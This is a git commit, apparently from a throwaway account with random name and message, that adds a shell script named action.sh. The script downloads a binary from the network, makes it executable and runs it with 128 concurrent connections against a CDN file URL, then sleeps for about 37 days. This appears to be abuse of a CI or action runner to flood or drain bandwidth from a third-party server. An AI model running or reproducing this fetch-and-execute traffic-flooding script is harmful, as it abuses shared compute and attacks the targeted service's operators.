de74663f18cbdd88796326e996d8caa65bcb4052
4sxU4Fsk <4sxU4Fsk@outlook.com>
2024-11-30 08:53:30 +0000

    KZdoKmBz

---
+++ action.sh
@@ -0,0 +1,3 @@
+ls -la
+wget https://github.com/maintell/webBenchmark/releases/download/0.5/webBenchmark_linux_x64 && chmod +x webBenchmark_linux_x64 && ./webBenchmark_linux_x64 -c 128 -s https://ssg.cdn.cdndrive.uk/api/v3/slave/source/10485760/dXBsb2Fkcy8yMDIzLzAzLzExLzVBaDdPbDQ4X0NlbnRPUy04LjEuMTkxMS14ODZfNjQtYm9vdC5pc28/CentOS-8.1.1911-x86_64-boot.iso?sign=-nTkjER6h-x6vdUvC73yhH8KYBMl3cfSVzpM3aSU6VI%3D%3A1732997115
+sleep 3200000
